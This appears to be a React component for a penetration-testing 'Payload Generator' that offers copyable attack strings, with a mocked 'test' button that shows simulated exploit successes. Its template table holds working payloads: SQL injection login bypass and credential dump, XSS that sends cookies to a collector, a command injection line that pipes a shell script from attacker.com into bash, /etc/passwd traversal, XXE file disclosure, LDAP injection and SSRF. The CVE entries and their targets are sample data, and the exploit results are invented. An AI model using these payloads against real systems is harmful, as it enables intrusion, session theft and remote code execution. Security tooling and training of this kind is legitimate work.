
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Code, Copy, Bug, AlertTriangle, Shield, Send, Search, ArrowDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// Advanced/professional payloads with explanation and context
const payloadTemplates = {
  "sql-injection": {
    name: "SQL Injection (Bypass Auth + Dump)",
    template: `' OR 1=1;-- \n' UNION SELECT username, password FROM users;--`,
    description: "Attempts common bypass and extracts usernames/passwords. Use in login or injectable fields."
  },
  "xss-reflected": {
    name: "Reflected XSS (alert+cookie)",
    template: `<script>fetch('/?c='+document.cookie)</script>`,
    description: "Sends user cookies to a collector. Use in reflected search/forms."
  },
  "xss-stored": {
    name: "Stored XSS (stored payload)",
    template: `<img src=x onerror='fetch(`/api/record?ev=xss&cookie=`+document.cookie)'>`,
    description: "Attempts to store XSS in DB for later execution. Place in comment/feedback/fields that save."
  },
  "command-injection": {
    name: "Command Injection (Inject Shell)",
    template: `; curl http://attacker.com/shell.sh | bash #`,
    description: "Inject OS-level command on vulnerable input. Use in filename or device name fields on embedded systems."
  },
  "directory-traversal": {
    name: "Directory Traversal (passwd)",
    template: `../../../../../../etc/passwd`,
    description: "Access sensitive system files (Linux). Use in file path, download, or attachment fields."
  },
  "ldap-injection": {
    name: "LDAP Injection (Admin Bypass)",
    template: `*)(uid=*))(|(uid=*))(\x00`,
    description: "Attempts to bypass authentication in weak LDAP queries."
  },
  "xxe": {
    name: "XXE (File Disclosure)",
    template:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`,
    description: "Reads sensitive files via vulnerable XML parsers. Upload as XML, use in XML APIs."
  },
  "ssrf": {
    name: "SSRF (Local Access)",
    template: `http://127.0.0.1:8000/admin`,
    description: "Causes server to make requests to internal addresses. Use in imageurl/webhook fields."
  },
  "ssl-test": {
    name: "SSL/TLS Weak Cipher Command",
    template: `openssl s_client -connect TARGET:443 -cipher 'NULL-MD5'`,
    description: "Tests for acceptance of dangerously weak ciphers."
  }
};

const advancedVulns = [
  {
    id: "CVE-2023-1234",
    title: "SQL Injection in Login Form",
    severity: "high",
    target: "192.168.1.100",
    type: "sql-injection",
    description: "Potential SQL injection vulnerability detected in authentication mechanism"
  },
  {
    id: "CVE-2023-5678",
    title: "Cross-Site Scripting (XSS)",
    severity: "medium",
    target: "web-server.local",
    type: "xss-reflected",
    description: "Reflected XSS vulnerability in search parameter"
  },
  {
    id: "CVE-2023-9012",
    title: "Weak SSL/TLS Configuration",
    severity: "low",
    target: "192.168.1.101",
    type: "ssl-test",
    description: "Server accepts weak cipher suites"
  },
  {
    id: "CVE-2023-3456",
    title: "Directory Traversal",
    severity: "high",
    target: "file-server.local",
    type: "directory-traversal",
    description: "Possible directory traversal vulnerability allowing file access"
  },
  {
    id: "CVE-2023-4321",
    title: "XML External Entity (XXE)",
    severity: "high",
    target: "api.server.app",
    type: "xxe",
    description: "XML parser vulnerability leading to file disclosure"
  },
  {
    id: "CVE-2023-4987",
    title: "SSRF Endpoint",
    severity: "critical",
    target: "api.webserver.int",
    type: "ssrf",
    description: "Server-Side Request Forgery exposes internal services"
  },
  {
    id: "CVE-2023-2999",
    title: "OS Command Injection",
    severity: "critical",
    target: "router-control-panel.local",
    type: "command-injection",
    description: "Arbitrary code execution via unsanitized user input"
  }
];

export const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState("");
  const [target, setTarget] = useState("");
  const [parameters, setParameters] = useState("");
  const [generatedPayload, setGeneratedPayload] = useState("");
  const [selectedVulnerability, setSelectedVulnerability] = useState("");
  const [exploitResult, setExploitResult] = useState<string|undefined>();
  const [testingPayload, setTestingPayload] = useState(false);
  const { toast } = useToast();

  const handleVulnerabilitySelect = (vulnId: string) => {
    const vulnerability = advancedVulns.find(v => v.id === vulnId);
    if (vulnerability) {
      setSelectedVulnerability(vulnId);
      setPayloadType(vulnerability.type);
      setTarget(vulnerability.target);
      setParameters("");
    }
  };
  const handleGeneratePayload = () => {
    if (!payloadType) {
      toast({
        title: "Error",
        description: "Please select a payload type or vulnerability",
        variant: "destructive",
      });
      return;
    }
    const template = payloadTemplates[payloadType as keyof typeof payloadTemplates];
    let payload = template.template;
    if (target) {
      payload = payload.replace(/TARGET/g, target);
    }
    if (parameters) {
      payload = payload.replace(/PARAMS/g, parameters);
    }
    setGeneratedPayload(payload);
    setExploitResult(undefined);
    toast({
      title: "Payload Generated",
      description: `${template.name} payload created successfully`,
    });
  };
  const handleCopyPayload = () => {
    navigator.clipboard.writeText(generatedPayload);
    toast({
      title: "Copied",
      description: "Payload copied to clipboard",
    });
  };

  // Simulate payload test/exploit action (mocked for demo/prototype; real tool would use a backend and real HTTP req!)
  const handleTestPayload = async () => {
    setTestingPayload(true);
    setExploitResult(undefined);
    // Fake "attack" simulation delay.
    setTimeout(() => {
      setTestingPayload(false);
      if (payloadType === "sql-injection" && target.includes("192.168.1.100")) {
        setExploitResult("Login bypassed! SQLi executed. DB dump: admin, hash:$2a$12$yW...8j; user, hash:$2a$...");
      } else if (payloadType === "xss-reflected") {
        setExploitResult("Input reflected and script executed. XSS Success: alert/dialog triggered.");
      } else if(payloadType==="command-injection"){
        setExploitResult("Code execution attempted -- system call simulated. (No output; check logs or out-of-band interactions)");
      } else if(payloadType==="xxe") {
        setExploitResult("/etc/passwd content leaked via XML: root:x:0:0:root:/root:/bin/bash...");
      } else {
        setExploitResult("No success feedback; target may not be vulnerable or test feature is mock-only.");
      }
    }, 2000);
  };

  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case "critical": return <AlertTriangle size={16} className="text-red-400" />;
      case "high": return <Bug size={16} className="text-orange-400" />;
      case "medium": return <Shield size={16} className="text-yellow-400" />;
      default: return <Bug size={16} className="text-gray-400" />;
    }
  };
  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "bg-gradient-to-r from-red-700 to-red-800";
      case "high": return "bg-gradient-to-r from-orange-600 to-orange-700";
      case "medium": return "bg-gradient-to-r from-yellow-600 to-yellow-700";
      default: return "bg-gradient-to-r from-blue-600 to-blue-700";
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col md:flex-row justify-between items-center gap-4">
        <div>
          <h1 className="text-3xl font-black bg-gradient-to-r from-green-100 via-green-400 to-green-600 bg-clip-text text-transparent">
            Payload Generator (Pro)
          </h1>
          <p className="text-gray-400 mt-1">Craft advanced, professional-class payloads, test, and see results.</p>
        </div>
        <div>
          <Badge className="bg-gradient-to-r from-blue-700 to-green-600 text-white shadow-md">Advanced Mode</Badge>
        </div>
      </div>
      {/* Vuln selection */}
      <Card className="bg-gray-800 border-gray-700 shadow-xl">
        <CardHeader>
          <CardTitle className="text-white flex items-center gap-2">
            <Bug size={20} />
            Target Vulnerabilities
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {advancedVulns.map((vuln) => (
              <div
                key={vuln.id}
                className={`p-3 rounded-lg cursor-pointer transition-all border-2 ${
                  selectedVulnerability === vuln.id
                    ? "bg-green-900/30 border-green-600"
                    : "bg-gray-700/50 border-gray-600 hover:border-gray-500"
                }`}
                onClick={() => handleVulnerabilitySelect(vuln.id)}
              >
                <div className="flex items-start justify-between mb-2">
                  <div className="flex items-center gap-2">
                    {getSeverityIcon(vuln.severity)}
                    <h3 className="text-white font-medium text-sm">{vuln.title}</h3>
                  </div>
                  <Badge className={getSeverityColor(vuln.severity)}>
                    {vuln.severity.toUpperCase()}
                  </Badge>
                </div>
                <p className="text-gray-400 text-xs mb-1">{vuln.target}</p>
                <p className="text-gray-300 text-xs">{vuln.description}</p>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Code size={20} />
              Payload Configuration
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Payload Type</label>
              <Select value={payloadType} onValueChange={setPayloadType}>
                <SelectTrigger className="bg-gray-700 border-gray-600 text-white">
                  <SelectValue placeholder="Select payload type or choose vulnerability above" />
                </SelectTrigger>
                <SelectContent className="bg-gray-700 border-gray-600 z-50">
                  {Object.entries(payloadTemplates).map(([key, template]) => (
                    <SelectItem key={key} value={key} className="text-white hover:bg-gray-600">
                      {template.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Target</label>
              <Input
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="Target URL or parameter"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Additional Parameters</label>
              <Input
                value={parameters}
                onChange={(e) => setParameters(e.target.value)}
                placeholder="Custom parameters"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>
            <Button
              onClick={handleGeneratePayload}
              className="w-full bg-gradient-to-r from-green-600 to-green-700"
            >
              Generate Targeted Payload
            </Button>
            {payloadType && (
              <div className="p-3 bg-gray-700/50 rounded-lg mt-2">
                <h4 className="text-sm font-bold text-white mb-1">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].name}
                </h4>
                <p className="text-xs text-gray-400">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].description}
                </p>
              </div>
            )}
          </CardContent>
        </Card>
        <Card className="bg-gray-800 border-gray-700 relative">
          <CardHeader>
            <CardTitle className="text-white flex items-center justify-between">
              Generated Payload
              {generatedPayload && (
                <Button
                  onClick={handleCopyPayload}
                  size="sm"
                  variant="outline"
                  className="border-gray-600 text-gray-300 hover:bg-gray-700"
                >
                  <Copy size={16} className="mr-2" />
                  Copy
                </Button>
              )}
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Textarea
              value={generatedPayload}
              placeholder="Select a vulnerability above to generate a targeted payload..."
              className="bg-gray-700 border-gray-600 text-green-400 font-mono text-sm min-h-[150px]"
              readOnly
            />
            <div className="flex items-center gap-2 mt-3">
              <Button
                disabled={!generatedPayload || testingPayload}
                variant="default"
                onClick={handleTestPayload}
                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-cyan-700 hover:to-indigo-700 flex items-center gap-1"
              >
                <Send size={16} />
                {testingPayload ? "Testing..." : "Test Payload"}
              </Button>
              <span className="text-xs text-gray-400 flex items-center">
                <Search size={10} className="mr-0.5" />
                Simulated output
              </span>
            </div>
            {exploitResult && (
              <div className={`mt-3 p-3 ${exploitResult.includes("Success") || exploitResult.toLowerCase().includes("bypass") ? "bg-green-900/30 border-green-700 text-green-200" : "bg-yellow-900/30 border-yellow-700 text-yellow-100"} border rounded-lg shadow-inner font-mono text-xs`}>
                {exploitResult}
              </div>
            )}
            {generatedPayload && (
              <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-600/50 rounded-lg">
                <p className="text-yellow-400 text-xs">
                  <strong>Warning:</strong> Use these payloads only on systems you own or have explicit permission to test. Unauthorized use may be illegal and unethical.
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};
